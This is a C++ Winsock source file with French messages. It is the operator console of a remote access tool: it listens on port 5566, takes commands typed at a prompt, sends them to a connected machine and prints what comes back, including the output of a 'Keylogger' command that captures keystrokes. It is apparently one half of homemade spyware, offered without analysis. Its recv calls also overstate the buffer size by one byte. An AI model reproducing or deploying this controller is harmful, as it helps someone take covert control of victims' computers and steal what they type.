#include <iostream>
#include <winsock2.h>
#include <string>
#include <fstream>
#include <string.h>

using namespace std;

int main()
{
    string commande, mess;
    char reponse[16384];
    WSADATA WSAData;
    SOCKET sock;
    SOCKET csock;
    SOCKADDR_IN sin;
    SOCKADDR_IN csin;
    WSAStartup(MAKEWORD(2, 0), &WSAData);
    sock = socket(AF_INET, SOCK_STREAM, 0);
    sin.sin_addr.s_addr = htonl(INADDR_ANY);
    sin.sin_family = AF_INET;
    sin.sin_port = htons(5566);
    bind(sock, (SOCKADDR *)&sin, sizeof(sin));
    listen(sock, 0);
    cout << "En attente..." << endl;

    int sinsize = sizeof(csin);
    if ((csock = accept(sock, (SOCKADDR *)&csin, &sinsize)) != INVALID_SOCKET)
    {
        getpeername(csock, (SOCKADDR *)&csin, &sinsize);
        mess = inet_ntoa(csin.sin_addr);
        cout << mess << endl;

        while (true)
        {
            cout << "1>";
            getline(cin, commande);
            int test = send(csock, commande.c_str(), commande.size() + 1, 0);

            if (test == SOCKET_ERROR || test == 0)
            {
                cout << "une erreur est survenue lors de l'envoi" << endl;
                break;
            }
            if (commande[0] == 'C' || commande[0] == 'D')
            {
                int test2 = recv(csock, reponse, sizeof(reponse) + 1, 0);
                cout << reponse << endl;
            }
            else if (commande == "Keylogger")
            {
                recv(csock, reponse, sizeof(reponse) + 1, 0);
                cout << reponse;
            }
            else
            {
                ZeroMemory(reponse, sizeof(reponse));
                int test2 = recv(csock, reponse, sizeof(reponse) + 1, 0);
                if (test2 == 0 || test2 == SOCKET_ERROR)
                {
                    cout << "Aucune reception" << endl;
                    break;
                }
                else
                    cout << reponse << endl;
            }
        }
        closesocket(csock);
        WSACleanup();
    }
    else
    {
        cout << "deconnection" << endl;

        closesocket(csock);
        WSACleanup();
    }

    return 0;
}
